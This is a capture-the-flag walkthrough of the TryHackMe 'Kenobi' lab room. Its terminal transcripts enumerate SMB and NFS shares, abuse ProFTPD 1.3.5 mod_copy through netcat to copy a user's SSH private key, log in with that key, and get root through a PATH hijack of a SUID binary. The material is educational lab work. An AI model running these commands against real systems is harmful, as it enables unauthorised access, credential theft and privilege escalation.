# Kenobi

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Walkthrough
Difficulty: Easy
Tags: Linux
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Free
Description:
Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of 
proftpd and escalate your privileges with path variable manipulation.
```

Room link: [https://tryhackme.com/room/kenobi](https://tryhackme.com/room/kenobi)

## Solution

### Task 1: Deploy the vulnerable machine

![Darth Vader](Images/Darth_Vader.gif)

This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.

---------------------------------------------------------------------------

#### Scan the box; how many ports are open?

Hint: nmap ip -vvv

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Kenobi]
└─$ sudo nmap -sC -sV $TARGET_IP 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-28 13:04 CET
Nmap scan report for 10.114.150.12
Host is up (0.029s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0c:a3:d3:48:0f:44:a7:65:4d:3d:cb:28:d0:b7:4d:9b (RSA)
|   256 42:28:da:6f:d6:f4:bf:2b:44:36:4e:51:09:c5:38:bf (ECDSA)
|_  256 c8:9f:47:ee:cd:ec:74:61:21:31:ad:46:0c:87:88:78 (ED25519)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      40821/tcp   mountd
|   100005  1,2,3      42401/udp   mountd
|   100005  1,2,3      45987/tcp6  mountd
|   100005  1,2,3      58511/udp6  mountd
|   100021  1,3,4      38707/tcp   nlockmgr
|   100021  1,3,4      45765/tcp6  nlockmgr
|   100021  1,3,4      53186/udp6  nlockmgr
|   100021  1,3,4      53611/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
2049/tcp open  nfs         3-4 (RPC #100003)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2026-02-28T12:04:27
|_  start_date: N/A
|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.77 seconds
```

**Note**: If you scan **all** ports the answer will we 11!

Answer: `7`

---------------------------------------------------------------------------

### Task 2: Enumerating Samba for shares

![Samba Logo](Images/Samba_Logo.png)

Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.

Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.

Using nmap we can enumerate a machine for SMB shares.

Nmap has the ability to run to automate a wide variety of networking tasks. There is a script to enumerate shares!

`nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.114.150.12`

SMB has two ports, 445 and 139.

![SMB Ports](Images/SMB_Ports.png)

---------------------------------------------------------------------------

#### Using the nmap command above, how many shares have been found?

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Kenobi]
└─$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.114.150.12
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-28 13:42 +0100
Nmap scan report for 10.114.150.12
Host is up (0.023s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 1.01 seconds

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Kenobi]
└─$ smbmap -H $TARGET_IP -u null -p null 

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.114.150.12:445       Name: 10.114.150.12             Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (kenobi server (Samba, Ubuntu))
[*] Closed 1 connections   

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Kenobi]
└─$ crackmapexec smb $TARGET_IP -u Guest -p '' --shares                                               
SMB         10.114.150.12   445    KENOBI           [*] Windows 6.1 Build 0 (name:KENOBI) (domain:KENOBI) (signing:False) (SMBv1:False)
SMB         10.114.150.12   445    KENOBI           [+] KENOBI\Guest: 
SMB         10.114.150.12   445    KENOBI           [+] Enumerated shares
SMB         10.114.150.12   445    KENOBI           Share           Permissions     Remark
SMB         10.114.150.12   445    KENOBI           -----           -----------     ------
SMB         10.114.150.12   445    KENOBI           print$                          Printer Drivers
SMB         10.114.150.12   445    KENOBI           anonymous       READ            
SMB         10.114.150.12   445    KENOBI           IPC$                            IPC Service (kenobi server (Samba, Ubuntu))
```

Answer: `3`

On most distributions of Linux `smbclient` is already installed. Lets inspect one of the shares.

`smbclient //10.114.150.12/anonymous`

Using your machine, connect to the machines network share.

![Connect with smbclient](Images/Connect_with_smbclient.png)

Once you're connected, list the files on the share.

#### What is the file can you see?

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Kenobi]
└─$ smbclient //$TARGET_IP/anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 12:49:09 2019
  ..                                  D        0  Sat Aug  9 15:03:22 2025
  log.txt                             N    12237  Wed Sep  4 12:49:09 2019

                9183416 blocks of size 1024. 2992224 blocks available
smb: \> quit

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Kenobi]
└─$ 
```

Answer: `log.txt`

You can recursively download the SMB share too. Submit the username and password as nothing.

`smbget -R smb://10.114.150.12/anonymous`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Kenobi]
└─$ smbget --recursive "smb://10.114.150.12/anonymous"
Password for [WORKGROUP\kali]:
Using domain: WORKGROUP, user: kali
smb://10.114.150.12/anonymous/log.txt                                                                                                                                                             
Downloaded 11.95kB in 2 seconds
```

**Note** the change in parameter!

Open the file on the share. There is a few interesting things found.

- Information generated for Kenobi when generating an SSH key for the user
- Information about the ProFTPD server.

#### What port is FTP running on?

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Kenobi]
└─$ head -n 40 log.txt
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
The key's randomart image is:
+---[RSA 2048]----+
|                 |
|           ..    |
|        . o. .   |
|       ..=o +.   |
|      . So.o++o. |
|  o ...+oo.Bo*o  |
| o o ..o.o+.@oo  |
|  . . . E .O+= . |
|     . .   oBo.  |
+----[SHA256]-----+

# This is a basic ProFTPD configuration file (rename it to 
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName                      "ProFTPD Default Installation"
ServerType                      standalone
DefaultServer                   on

# Port 21 is the standard FTP port.
Port                            21

# Don't use IPv6 support by default.
UseIPv6                         off

# Umask 022 is a good standard umask to prevent new dirs and files
# from being group and world writable.
Umask                           022

```

Answer: `21`

Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve.

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

`nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.114.150.12`

#### What mount can we see?

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Kenobi]
└─$ nmap -v -p 111 --script nfs-* $TARGET_IP
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-28 14:29 +0100
NSE: Loaded 3 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
Initiating Ping Scan at 14:29
Scanning 10.114.150.12 [4 ports]
Completed Ping Scan at 14:29, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:29
Completed Parallel DNS resolution of 1 host. at 14:29, 0.50s elapsed
Initiating SYN Stealth Scan at 14:29
Scanning 10.114.150.12 [1 port]
Discovered open port 111/tcp on 10.114.150.12
Completed SYN Stealth Scan at 14:29, 0.05s elapsed (1 total ports)
NSE: Script scanning 10.114.150.12.
Initiating NSE at 14:29
Completed NSE at 14:29, 0.62s elapsed
Nmap scan report for 10.114.150.12
Host is up (0.022s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| ??????????  ?    ?    ?     ?                    ..
| rwxr-xr-x   0    0    4096  2026-02-28T12:35:09  backups
| rwxr-xr-x   0    0    4096  2025-08-10T06:48:58  cache
| rwxrwxrwx   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2026-02-28T11:56:24  log
| rwxr-xr-x   0    0    4096  2025-08-09T13:38:21  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9183416.0  5700608.0  2992212.0  66%   16.0T        32000
| nfs-showmount: 
|_  /var *

NSE: Script Post-scanning.
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.44 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (72B)
```

Answer: `/var`

---------------------------------------------------------------------------

### Task 3: Gain Initial access with ProFtpd

![ProFtpd Logo](Images/ProFtpd_Logo.png)

ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.

---------------------------------------------------------------------------

Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port.

#### What is the version?

Hint: nc machines_ip 21

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Kenobi]
└─$ nc $TARGET_IP 21                        
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.114.150.12]
^C
```

Answer: `1.3.5`

We can use searchsploit to find exploits for a particular software version.

Searchsploit is basically just a command line search tool for exploit-db.com.

#### How many exploits are there for the ProFTPd running?

Hint: searchsploit proftpd version

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Kenobi]
└─$ searchsploit proftpd 1.3.5
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                  |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                                       | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                                             | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                                                         | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                                                                                       | linux/remote/36742.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Answer: `4`

You should have found an exploit from ProFtpd's [mod_copy module](http://www.proftpd.org/docs/contrib/mod_copy.html).

The mod_copy module implements **SITE CPFR** and **SITE CPTO** commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user.

We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.

![File Copy via FTP](Images/File_Copy_via_FTP.png)

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Kenobi]
└─$ nc $TARGET_IP 21          
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.114.150.12]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
QUIT
221 Goodbye.
```

We knew that the `/var` directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the `/var/tmp` directory.

Lets mount the `/var/tmp` directory to our machine

`mkdir /mnt/kenobiNFS`  
`mount 10.114.150.12:/var /mnt/kenobiNFS`  
`ls -la /mnt/kenobiNFS`

![NFS Mount on Kenobi 1](Images/NFS_Mount_on_Kenobi_1.png)

We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.

![NFS Mount on Kenobi 2](Images/NFS_Mount_on_Kenobi_2.png)

#### What is Kenobi's user flag (/home/kenobi/user.txt)?

Mount the NFS Share and check the contents

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Kenobi]
└─$ sudo mount $TARGET_IP:/var /mnt/mount_pt
[sudo] password for kali: 

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Kenobi]
└─$ ls -la /mnt/mount_pt 
total 56
drwxr-xr-x 14 root root  4096 Sep  4  2019 .
drwxr-xr-x  4 root root  4096 Dec 19  2024 ..
drwxr-xr-x  2 root root  4096 Feb 28 13:35 backups
drwxr-xr-x 15 root root  4096 Aug 10  2025 cache
drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
drwxr-xr-x 51 root root  4096 Aug 10  2025 lib
drwxrwsr-x  2 root staff 4096 Apr 12  2016 local
lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 13 root avahi 4096 Feb 28 12:56 log
drwxrwsr-x  2 root mail  4096 Feb 27  2019 mail
drwxr-xr-x  2 root root  4096 Feb 27  2019 opt
lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
drwxr-xr-x  5 root root  4096 Aug  9  2025 snap
drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
drwxrwxrwt  8 root root  4096 Feb 28 13:02 tmp
drwxr-xr-x  3 root root  4096 Sep  4  2019 www

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Kenobi]
└─$ ls -la /mnt/mount_pt/tmp
ls: /mnt/mount_pt/tmp/systemd-private-9e1d1ed330964dbf89272c7ea1d66894-systemd-timesyncd.service-xHrIjj: Permission denied
ls: /mnt/mount_pt/tmp/systemd-private-9e1d1ed330964dbf89272c7ea1d66894-systemd-logind.service-cye47g: Permission denied
ls: /mnt/mount_pt/tmp/systemd-private-9e1d1ed330964dbf89272c7ea1d66894-systemd-resolved.service-KLnzah: Permission denied
ls: /mnt/mount_pt/tmp/systemd-private-9e1d1ed330964dbf89272c7ea1d66894-apache2.service-4mCnKg: Permission denied
ls: /mnt/mount_pt/tmp/systemd-private-9e1d1ed330964dbf89272c7ea1d66894-ModemManager.service-6YSK6e: Permission denied
total 36
drwxrwxrwt  8 root root 4096 Feb 28 13:02 .
drwxr-xr-x 14 root root 4096 Sep  4  2019 ..
drwxrwxrwt  2 root root 4096 Feb 28 12:56 cloud-init
-rw-r--r--  1 kali kali 1675 Feb 28 14:48 id_rsa
drwx------  3 root root 4096 Feb 28 12:56 systemd-private-9e1d1ed330964dbf89272c7ea1d66894-apache2.service-4mCnKg
drwx------  3 root root 4096 Feb 28 12:56 systemd-private-9e1d1ed330964dbf89272c7ea1d66894-ModemManager.service-6YSK6e
drwx------  3 root root 4096 Feb 28 12:56 systemd-private-9e1d1ed330964dbf89272c7ea1d66894-systemd-logind.service-cye47g
drwx------  3 root root 4096 Feb 28 12:56 systemd-private-9e1d1ed330964dbf89272c7ea1d66894-systemd-resolved.service-KLnzah
drwx------  3 root root 4096 Feb 28 12:56 systemd-private-9e1d1ed330964dbf89272c7ea1d66894-systemd-timesyncd.service-xHrIjj
```

Copy the SSH private key and fix file permissions

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Kenobi]
└─$ cp /mnt/mount_pt/tmp/id_rsa .

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Kenobi]
└─$ sudo chmod 600 id_rsa   
```

Login with the private key and get the user flag

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Kenobi]
└─$ ssh -i id_rsa kenobi@$TARGET_IP
The authenticity of host '10.114.150.12 (10.114.150.12)' can't be established.
ED25519 key fingerprint is SHA256:F94ffdisBLKIWuKCxaz19bd4l6ig36eDI0mdiDgXvJg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.114.150.12' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 28 Feb 2026 07:59:50 AM CST

  System load:  0.08              Processes:             121
  Usage of /:   62.2% of 8.76GB   Users logged in:       0
  Memory usage: 17%               IPv4 address for eth0: 10.114.150.12
  Swap usage:   0%

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

40 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 20.04 at
https://ubuntu.com/20-04


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Sat Aug  9 07:57:51 2025 from 10.23.8.228
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ ls -l
total 8
drwxr-xr-x 2 kenobi kenobi 4096 Sep  4  2019 share
-rw-rw-r-- 1 kenobi kenobi   33 Sep  4  2019 user.txt
kenobi@kenobi:~$ cat user.txt
d<REDACTED>9
kenobi@kenobi:~$ 
```

Answer: `d<REDACTED>9`

---------------------------------------------------------------------------

### Task 4: Privilege Escalation with Path Variable Manipulation

![Special File Permissions](Images/Special_File_Permissions.png)

Lets first understand what what SUID, SGID and Sticky Bits are.

|Permission|On Files|On Directories|
|----|----|----|
|SUID Bit|User executes the file with permissions of the *file owner*|-|
|SGID Bit|User executes the file with the permission of the *group owner*.|File created in directory gets the same group owner.|
|Sticky Bit|No meaning|Users are prevented from deleting files from other users.|

SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

To search the a system for these type of files run the following:

`find / -perm -u=s -type f 2>/dev/null`

---------------------------------------------------------------------------

#### What file looks particularly out of the ordinary?

```bash
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/snap/core20/2599/usr/bin/chfn
/snap/core20/2599/usr/bin/chsh
/snap/core20/2599/usr/bin/gpasswd
/snap/core20/2599/usr/bin/mount
/snap/core20/2599/usr/bin/newgrp
/snap/core20/2599/usr/bin/passwd
/snap/core20/2599/usr/bin/su
/snap/core20/2599/usr/bin/sudo
/snap/core20/2599/usr/bin/umount
/snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2599/usr/lib/openssh/ssh-keysign
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/su
kenobi@kenobi:~$ 
```

Answer: `/usr/bin/menu`

#### Run the binary, how many options appear?

```bash
kenobi@kenobi:~$ menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Sat, 28 Feb 2026 14:07:35 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html

kenobi@kenobi:~$ 
```

Answer: `3`

Strings is a command on Linux that looks for human readable strings on a binary.

```bash
kenobi@kenobi:~$ strings -n 6 /usr/bin/menu | head -n 20
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
kenobi@kenobi:~$ 
```

This shows us the binary is running without a full path (e.g. not using `/usr/bin/curl` or `/usr/bin/uname`).

As this file runs as the root users privileges, we can manipulate our path gain a root shell.

![Exploitation on Kenobi](Images/Exploitation_on_Kenobi.png)

We copied the `/bin/sh` shell, called it `curl`, gave it the correct permissions and then put its location in our path. This meant that when the `/usr/bin/menu` binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of `/usr/sh`, as well as this file being run as root it runs our shell as root!

```bash
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl 
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# 
```

#### What is the root flag (/root/root.txt)?

```bash
# cat /root/root.txt
1<REDACTED>2
# 
```

Answer: `1<REDACTED>2`

---------------------------------------------------------------------------

For additional information, please see the references below.

## References

- [chmod - Linux manual page](https://man7.org/linux/man-pages/man1/chmod.1.html)
- [CrackMapExec - GitHub](https://github.com/byt3bl33d3r/CrackMapExec)
- [CrackMapExec - Kali Tools](https://www.kali.org/tools/crackmapexec/)
- [CrackMapExec - Wiki](https://github.com/byt3bl33d3r/CrackMapExec/wiki)
- [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
- [head - Linux manual page](https://man7.org/linux/man-pages/man1/head.1.html)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [mount - Linux manual page](https://man7.org/linux/man-pages/man8/mount.8.html)
- [nc - Linux manual page](https://linux.die.net/man/1/nc)
- [netcat - Wikipedia](https://en.wikipedia.org/wiki/Netcat)
- [Network File System - Wikipedia](https://en.wikipedia.org/wiki/Network_File_System)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [Nmap - Wikipedia](https://en.wikipedia.org/wiki/Nmap)
- [PATH (variable) - Wikipedia](https://en.wikipedia.org/wiki/PATH_(variable))
- [Portmap - Wikipedia](https://en.wikipedia.org/wiki/Portmap)
- [ProFTPD - Wikipedia](https://en.wikipedia.org/wiki/ProFTPD)
- [Samba (software) - Wikipedia](https://en.wikipedia.org/wiki/Samba_(software))
- [searchsploit - Kali Tools](https://www.kali.org/tools/exploitdb/#searchsploit)
- [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
- [Server Message Block - Wikipedia](https://en.wikipedia.org/wiki/Server_Message_Block)
- [smbclient - Kali Tools](https://www.kali.org/tools/samba/#smbclient)
- [smbclient - Linux manual page](https://linux.die.net/man/1/smbclient)
- [smbget - Kali Tools](https://www.kali.org/tools/samba/#smbget)
- [smbget - Linux manual page](https://linux.die.net/man/1/smbget)
- [Smbmap - GitHub](https://github.com/ShawnDEvans/smbmap)
- [Smbmap - Kali Tools](https://www.kali.org/tools/smbmap/)
- [ssh - Linux manual page](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [String (computer science) - Wikipedia](https://en.wikipedia.org/wiki/String_(computer_science))
- [strings - Linux manual page](https://man7.org/linux/man-pages/man1/strings.1.html)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [Privilege escalation - Wikipedia](https://en.wikipedia.org/wiki/Privilege_escalation)
- [Setuid - Wikipedia](https://en.wikipedia.org/wiki/Setuid)
